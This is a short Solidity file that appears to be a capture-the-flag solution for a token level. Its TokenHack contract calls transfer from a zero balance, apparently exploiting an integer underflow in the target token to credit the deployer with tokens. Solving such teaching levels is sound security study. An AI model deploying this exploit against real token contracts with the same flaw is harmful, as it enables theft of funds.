/**
 * How to beat this level:
 * 1) Deploy TokenHack
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract TokenHack {
    IToken private immutable target;

    constructor(address _target) {
        target = IToken(_target);
        target.transfer(msg.sender, 1000);
    }
}
